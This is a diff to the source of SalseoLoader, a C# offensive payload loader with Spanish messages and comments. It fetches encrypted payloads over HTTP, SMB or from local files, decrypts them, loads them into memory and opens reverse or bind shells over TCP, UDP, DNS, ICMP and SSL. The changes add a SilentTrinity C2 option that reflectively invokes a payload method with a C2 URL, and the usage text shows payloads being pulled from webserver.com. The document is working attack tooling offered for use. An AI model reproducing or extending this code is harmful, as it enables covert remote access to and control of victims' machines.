@@ -133,11 +133,12 @@ namespace SalseoDecrypter
     [-] SalseoLoader.exe password http://webserver.com/elfuckingmal.txt BindTCP LHOST LPORT
     [-] SalseoLoader.exe password c:\temp\elfuckingmal.txt ReverseSSL LHOST LPORT
     [-] SalseoLoader.exe password http://webserver.com/shellcode.txt shellcode
+    [-] SalseoLoader.exe password http://webserver.com/silent.txt silenttrinity URL_C2C
     
-[+] Shells availables:
+[+] Available Payloads:
 
-    [-] ReverseTCP  [-] ReverseDNS   [-] ReverseSSL
-    [-] ReverseUDP  [-] ReverseICMP  [-] BindTCP
+    [-] ReverseTCP  [-] ReverseDNS   [-] ReverseSSL  [-] Shellcode
+    [-] ReverseUDP  [-] ReverseICMP  [-] BindTCP     [-] SilentTrinity
 
 ";
                 // Ayuda();
@@ -159,8 +160,9 @@ namespace SalseoDecrypter
             if (funcion == "reverseudp") { if (args.Length < 5) { Console.WriteLine("\n[-] Necesitas introducir un puerto :("); Environment.Exit(1); } }
             if (funcion == "reversedns") { if (args.Length < 5) { Console.WriteLine("\n[-] Necesitas introducir un nombre de dominio :("); Environment.Exit(1); } }
             if (funcion == "reverseicmp") { if (args.Length < 4) { Environment.Exit(1); } }
-            if (funcion == "shellcode") { if (args.Length < 2) { Console.Write("aqui entra"); Environment.Exit(1); } }
-            if (funcion != "reversetcp" & funcion != "reversedns" & funcion != "reverseicmp" & funcion != "reverseudp" & funcion != "bindtcp" & funcion != "reversessl" & funcion != "shellcode") { Console.WriteLine("\n[-] Error en el tipo de shell :("); Environment.Exit(1); }
+            if (funcion == "shellcode") { if (args.Length < 2) { Environment.Exit(1); } }
+            if (funcion != "reversetcp" & funcion != "reversedns" & funcion != "reverseicmp" & funcion != "reverseudp" & funcion != "bindtcp" & funcion != "reversessl" & funcion != "shellcode" & funcion != "silenttrinity") { Console.WriteLine("\n[-] Error en el tipo de shell :("); Environment.Exit(1); }
+            if (funcion == "silenttrinity") { if (args.Length < 3) { Environment.Exit(1); } } 
             Console.ForegroundColor = ConsoleColor.Gray;
             if (args[1].ToString().Substring(0, 4).ToLower() == "http") { Salseo_Encriptado = ClienteWeb.LeePayload(args[1].ToString()); }
             if (args[1].ToString().Substring(0, 2).ToLower() == "\\\\") { Console.WriteLine("[+] Leyendo datos via SMB..."); if (System.IO.File.Exists(Salseo_URL) == false) { Console.WriteLine("[-] Error: No se pudo leer el payload ¿ La ruta es correcta ?"); Environment.Exit(1); } Salseo_Encriptado = LeeArchivoSMBorLocal.Archivo(args[1].ToString()); }
@@ -175,7 +177,7 @@ namespace SalseoDecrypter
             string clases = null;
             Assembly salsongo = null;
             
-            if (funcion != "shellcode")
+            if (funcion != "shellcode" )
             {
                 salsongo = Assembly.Load(Final_Payload);
                 Console.WriteLine("[+] Cargando la salsa en memoria.");
@@ -183,10 +185,21 @@ namespace SalseoDecrypter
                 foreach (Type infoass in salsongo.GetTypes()) { var strclase = string.Format("{0}", infoass.Name); clases = strclase; };
                 //######################## Foreach de los metodos ####################
                 //#####################################################################
-                Console.WriteLine("[+] Version: " + salsongo.GetName().Version.ToString());
-                Console.ForegroundColor = ConsoleColor.White;
+                //Console.WriteLine("[+] Version: " + salsongo.GetName().Version.ToString());
+                //Console.ForegroundColor = ConsoleColor.White;
                 //#############################################################
 
+            }
+
+            //########################### LLamada a funcion SilentTrinity ########################
+            if (funcion == "silenttrinity")
+            {
+                string URLSILENT = args[3].ToString();
+                string[] argumentos = new string[] { URLSILENT + " " };
+                Type myType = salsongo.GetTypes()[0];
+                MethodInfo Method = myType.GetMethod("lanza");
+                object myInstance = Activator.CreateInstance(myType);
+                Method.Invoke(myInstance, new object[] { argumentos });
             }
             //########################### LLamada a funcion Reversa ########################
             if (funcion == "reversetcp")
@@ -472,6 +485,7 @@ namespace SalseoDecrypter
 
         }
     }
+
 
 
 
